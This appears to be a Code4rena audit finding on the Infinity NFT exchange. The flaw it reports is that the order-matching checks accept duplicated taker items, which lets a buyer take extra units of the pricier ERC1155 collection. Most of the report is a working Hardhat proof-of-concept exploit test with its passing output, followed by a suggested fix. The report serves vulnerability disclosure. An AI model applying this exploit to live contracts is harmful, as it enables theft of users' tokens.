## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [`canExecTakeOrder` mismatches `makerOrder` and `takerItems` when duplicated items present](https://github.com/code-423n4/2022-06-infinity-findings/issues/12) 

# Lines of code

https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164
https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116
https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364
https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243


# Vulnerability details

## Impact
When any user provides a `sellOrder` and they are trying to sell multiple tokens from _n_ (n > 1) different `ERC1155` collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.

In short, hackers can violate the user-defined orders.

## Root Cause
The logic of `canExecTakeOrder` and `canExecMatchOneToMany` is not correct.

__Let's `canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems) ` as an example, while `canExecMatchOneToMany` shares the same error.__ 

Specifically, it first checks whether the number of selling item in `makerOrder` matches with the ones in `takerItems`. Note that the number is an aggregated one. Then, it check whether all the items in `takerItems` are within the scope defined by `makerOrder`.

The problem comes when there are duplicated items in `takerItems`. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means `takerItems` exactly matches all items in `makerOrder`, which means violation of the order.

For example, if the order requires
```
[
    {
          collection: mock1155Contract1.address,
          tokens: [{ tokenId: 0, numTokens: 1 }]
    },
    {
          collection: mock1155Contract2.address,
          tokens: [{ tokenId: 0, numTokens: 1 }]
    }
];

```

and the taker provides
```
[
    {
          collection: mock1155Contract1.address,
          tokens: [{ tokenId: 0, numTokens: 1 }]
    },
    {
          collection: mock1155Contract1.address,
          tokens: [{ tokenId: 0, numTokens: 1 }]
    }
];
```

The taker can grabs two `mock1155Contract1` tokens by paying the order which tries to sell a `mock1155Contract1` token and a `mock1155Contract2` token. When `mock1155Contract1` is much more expensive, the victim user will suffer from a huge loss.

As for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells `mock1155Contract1` tokens. The attack is easy to perform.

## Proof of Concept
First put the `MockERC1155.sol` under the `contracts/` directory:
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;
import {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol';
import {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol';
import {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';

contract MockERC1155 is ERC1155URIStorage, Ownable {
  uint256 numMints;

  constructor(string memory uri) ERC1155(uri) {}

  function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {
    super._mint(to, id, amount, data);
  }
}
```

And then put `poc.js` under the `test/` directory.
```js
const { expect } = require('chai');
const { ethers, network } = require('hardhat');
const { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils');
const {
  getCurrentSignedOrderPrice,
  approveERC20,
  grantApprovals,
  signOBOrder
} = require('../helpers/orders');

async function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {
  // grant approvals
  const approvals = await grantApprovals(user, order, signer, infinityExchange.address);
  if (!approvals) {
    return undefined;
  }

  // sign order
  const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);

  const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);
  if (!isSigValid) {
    console.error('Signature is invalid');
    return undefined;
  }
  return signedOBOrder;
}

describe('PoC', function () {
  let signers,
    dev,
    matchExecutor,
    victim,
    hacker,
    token,
    infinityExchange,
    mock1155Contract1,
    mock1155Contract2,
    obComplication

  const sellOrders = [];

  let orderNonce = 0;

  const UNIT = toBN(1e18);
  const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);

  const totalNFTSupply = 100;
  const numNFTsToTransfer = 50;
  const numNFTsLeft = totalNFTSupply - numNFTsToTransfer;

  function toBN(val) {
    return ethers.BigNumber.from(val.toString());
  }

  before(async () => {
    // signers
    signers = await ethers.getSigners();
    dev = signers[0];
    matchExecutor = signers[1];
    victim = signers[2];
    hacker = signers[3];
    // token
    token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);

    // NFT constracts (ERC1155)
    mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [
      'uri1'
    ]);
    mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [
      'uri2'
    ]);

    // Exchange
    infinityExchange = await deployContract(
      'InfinityExchange',
      await ethers.getContractFactory('InfinityExchange'),
      dev,
      [token.address, matchExecutor.address]
    );

    // OB complication
    obComplication = await deployContract(
      'InfinityOrderBookComplication',
      await ethers.getContractFactory('InfinityOrderBookComplication'),
      dev
    );

    // add currencies to registry
    await infinityExchange.addCurrency(token.address);
    await infinityExchange.addCurrency(NULL_ADDRESS);

    // add complications to registry
    await infinityExchange.addComplication(obComplication.address);

    // send assets
    await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());
    await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());
    for (let i = 0; i < numNFTsToTransfer; i++) {
      await mock1155Contract1.mint(victim.address, i, 50, '0x');
      await mock1155Contract2.mint(victim.address, i, 50, '0x');
    }
  });

  describe('StealERC1155ByDuplicateItems', () => {
    it('Passed test denotes successful hack', async function () {
      // prepare order
      const user = {
        address: victim.address
      };
      const chainId = network.config.chainId ?? 31337;
      const nfts = [
        {
          collection: mock1155Contract1.address,
          tokens: [{ tokenId: 0, numTokens: 1 }]
        },
        {
          collection: mock1155Contract2.address,
          tokens: [{ tokenId: 0, numTokens: 1 }]
        }
      ];
      const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };
      const extraParams = {};
      const nonce = ++orderNonce;
      const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], [user.address, nonce, chainId]);
      let numItems = 0;
      for (const nft of nfts) {
        numItems += nft.tokens.length;
      }
      const order = {
        id: orderId,
        chainId,
        isSellOrder: true,
        signerAddress: user.address,
        numItems,
        startPrice: ethers.utils.parseEther('1'),
        endPrice: ethers.utils.parseEther('1'),
        startTime: nowSeconds(),
        endTime: nowSeconds().add(10 * 60),
        nonce,
        nfts,
        execParams,
        extraParams
      };
      const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);
      expect(sellOrder).to.not.be.undefined;

      // form matching nfts
      const nfts_ = [
        {
          collection: mock1155Contract1.address,
          tokens: [{ tokenId: 0, numTokens: 1 }]
        },
        {
          collection: mock1155Contract1.address,
          tokens: [{ tokenId: 0, numTokens: 1 }]
        }
      ];

      // approve currency
      let salePrice = getCurrentSignedOrderPrice(sellOrder);
      await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);

      // perform exchange
      await infinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);

      // owners after sale
      // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1
      // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss
      expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);
    });
  });
});
```

And run 
```bash
$ npx hardhat test --grep PoC

  PoC
    StealERC1155ByDuplicateItems
      ✓ Passed test denotes successful hack
```

Note that the passed test denotes a successful hack.

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
I would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.

